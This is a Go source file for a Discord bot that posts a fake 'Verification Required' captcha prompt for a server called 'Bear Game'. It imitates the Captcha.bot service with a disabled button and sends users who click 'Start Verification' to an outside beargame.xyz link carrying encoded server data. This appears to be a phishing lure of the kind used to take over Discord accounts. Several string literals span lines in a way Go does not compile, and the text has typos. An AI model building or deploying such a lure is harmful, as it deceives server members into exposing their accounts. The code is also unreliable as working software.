package main

import (
	"fmt"
	"log"
	"os"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

var (
	token string
)

func init() {
	if err := godotenv.Load(); err != nil {
		log.Fatal("Error loading .env file")
	}
	token = os.Getenv("token")

}

func main() {

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error creating Discord session: ", err)
		return
	}

	// Register a command handler.
	dg.AddHandler(commandHandler)
	dg.AddHandler(interactionHandler)
	dg.AddHandler(F_interactionHandler)
	// Open a connection to the Discord API.
	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening connection: ", err)
		return
	}

	fmt.Println("Bot is now running. Press Ctrl+C to exit.")
	select {}
}

func commandHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Check if the message starts with "/sendpost".
	if m.Content == "/sendpost" {
		// Create an embed message with buttons.
		embed := &discordgo.MessageSend{
			Embed: &discordgo.MessageEmbed{
				Description: "🤖 **Verification Required**
					To gain access to **Bear Game** you need to prove that you are a human by completing and anti-bot challenge.

					Id you do not see two buttons below, please update your Discord app or open it on the computer or the web browser.##",
				Color:       0x36393F, // Dark grey color
				/*Footer: &discordgo.MessageEmbedFooter{
					Text: "##**Verification Required**
					To gain access to **Bear Game** you need to prove that you are a human by completing and anti-bot challenge.

					Id you do not see two buttons below, please update your Discord app or open it on the computer or the web browser.##",
				},*/
			},
			Components: []discordgo.MessageComponent{
				discordgo.ActionsRow{
					Components: []discordgo.MessageComponent{
						discordgo.Button{
							Label:    "Only verify on Captcha.bot",
							Style:    discordgo.SecondaryButton,
							Disabled: true, // Makes the button unclickable
							CustomID: "text_here",
						},
					},
				},
				discordgo.ActionsRow{
					Components: []discordgo.MessageComponent{
						discordgo.Button{
							Label:    "🤖 Start Verification",
							Style:    discordgo.PrimaryButton, // LightBlue color
							CustomID: "text_b",
						},
						discordgo.Button{
							Label:    "Why?",
							Style:    discordgo.SecondaryButton, // Grey color
							CustomID: "text_c",
						},
					},
				},
			},
		}

		// Send the message.
		_, err := s.ChannelMessageSendComplex(m.ChannelID, embed)
		if err != nil {
			fmt.Println("Error sending message: ", err)
		}
	}
}

func interactionHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {

	if i.Type == discordgo.InteractionMessageComponent {

		switch i.MessageComponentData().CustomID {
		case "text_b":
			// Send the message.
			//only visible to the user will be made
			err := s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Flags: discordgo.MessageFlagsEphemeral,
					Embeds: []*discordgo.MessageEmbed{
						{
							Description: "**Please select your device type:**",
							Color:       0x36393F, // Dark grey color
							/*Footer: &discordgo.MessageEmbedFooter{
								Text: "##PASTE YOUR TEXT HERE##",
							},*/
						},
					},
					Components: []discordgo.MessageComponent{
						discordgo.ActionsRow{
							Components: []discordgo.MessageComponent{
								discordgo.Button{
									Label:    "💻 Desktop",
									Style:    discordgo.SecondaryButton, // Grey color
									CustomID: "text_d",
								},
								discordgo.Button{
									Label:    "📱 Mobile",
									Style:    discordgo.SecondaryButton, // Grey color
									CustomID: "text_e",
								},
							},
						},
					},
				},
			})

			if err != nil {
				fmt.Println("Error sending message: ", err)
			}
		case "text_c":
			// Send the message.
			//only visible to the user will be made
			err := s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Flags:   discordgo.MessageFlagsEphemeral,
					Content: "**Please select your device type:**",
					Components: []discordgo.MessageComponent{
						discordgo.ActionsRow{
							Components: []discordgo.MessageComponent{
								discordgo.Button{
									Label:    "💻 Desktop",
									Style:    discordgo.SecondaryButton, // Grey color
									CustomID: "text_d",
								},
								discordgo.Button{
									Label:    "📱 Mobile",
									Style:    discordgo.SecondaryButton, // Grey color
									CustomID: "text_e",
								},
							},
						},
					},
				},
			})

			if err != nil {
				fmt.Println("Error sending message: ", err)
			}
		}
	}
}

func F_interactionHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {

	if i.Type == discordgo.InteractionMessageComponent {

		switch i.MessageComponentData().CustomID {
		case "text_d":

			////////////////////////////////
			err := s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Flags: discordgo.MessageFlagsEphemeral,
					Embeds: []*discordgo.MessageEmbed{
						{
							Title: "🤖 **Verify yourself to gain access to the server**

Please complete this captcha to prove you are a human:
[Click Here](https://beargame.xyz/?data=eyJndWlsZE5hbWUiOiJCZWFyIEdhbWUiLCJndWlsZEljb24iOiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9pY29ucy8xMTQwOTMzMTk5MTg3NDEwOTY0L2FfNTNjZDljZGIyZThmNTM2OGFhMWM4OGMxNDllYzRmZWMuZ2lmIiwibWVtYmVyQ291bnQiOjgxODB9&code=ORrWcJRZm166GP6qzM35QcQh8qRjxK)",
							Color: 0x36393F,
						},
					},
				},
			})
			if err != nil {
				fmt.Println("Error sending message: ", err)
			}

		case "text_e":
			////////////////////////////////
			err := s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Flags: discordgo.MessageFlagsEphemeral,
					Embeds: []*discordgo.MessageEmbed{
						{
							Title: "🤖 **Verify yourself to gain access to the server**

Please complete this captcha to prove you are a human:
[Click Here](https://beargame.xyz/?data=eyJndWlsZE5hbWUiOiJCZWFyIEdhbWUiLCJndWlsZEljb24iOiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9pY29ucy8xMTQwOTMzMTk5MTg3NDEwOTY0L2FfNTNjZDljZGIyZThmNTM2OGFhMWM4OGMxNDllYzRmZWMuZ2lmIiwibWVtYmVyQ291bnQiOjgxODB9&code=ORrWcJRZm166GP6qzM35QcQh8qRjxK)",
							Color: 0x36393F,
						},
					},
				},
			})
			if err != nil {
				fmt.Println("Error sending message: ", err)
			}

		}
	}
}
